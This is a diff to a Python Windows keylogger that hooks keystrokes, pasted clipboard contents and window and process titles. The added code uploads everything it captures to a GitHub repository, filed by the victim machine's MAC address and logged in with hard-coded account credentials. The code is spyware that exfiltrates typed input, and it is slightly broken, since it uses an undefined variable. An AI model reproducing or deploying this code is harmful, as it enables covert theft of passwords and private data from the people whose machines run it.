@@ -5,10 +5,33 @@ import win32clipboard
 import win32api
 import time
 
+
+
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
+
+
+def connect_to_github():
+    gh = login(username="OXVyeah", password="heiya233")
+    #print(gh)
+    repo = gh.repository("OXVyeah", "yeah")
+    return repo
+
+def network(): 
+    c = wmi.WMI ()
+    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
+        print "MAC: %s" % interface.MACAddress 
+        return str(interface.MACAddress).replace(":","-")
+
+def upKeyboard(rep,msg,pcname):
+	if rep.contents("data/"+pcname+"/keyboard.txt") == None :
+	#	print "ip"
+		rep.create_file("data/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
+	con = rep.contents("data/"+pcname+"/keyboard.txt")
+	d,t = fileOperation.getLocalTime()
+	upFile(con,msg,"upload keyboard "+d+" "+t)
 
 
 def get_current_process():
@@ -36,6 +59,10 @@ def get_current_process():
     print
     print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
     print
+    
+    return "[ PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value)
+
+    
 
     # close handles
     kernel32.CloseHandle(hwnd)
@@ -44,15 +71,21 @@ def get_current_process():
 
 def KeyStroke(event):
     global current_window
+    r=connect_to_github()
+    m=network()
+    msg = ""
 
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
-        get_current_process()
+        msg += get_current_process()
+        
 
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
+        msg += str(chr(event.Ascii))
         print chr(event.Ascii),
+        
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
@@ -60,10 +93,13 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
+            msg += "[PASTE] - %s" % (pasted_value)
             print "[PASTE] - %s" % (pasted_value),
         else:
+            msg += "[%s]" % event.Key
             print "[%s]" % event.Key,
-
+    
+    upKeyboard(r,msg,mac)
     # pass execution to next hook registered
     return True
 
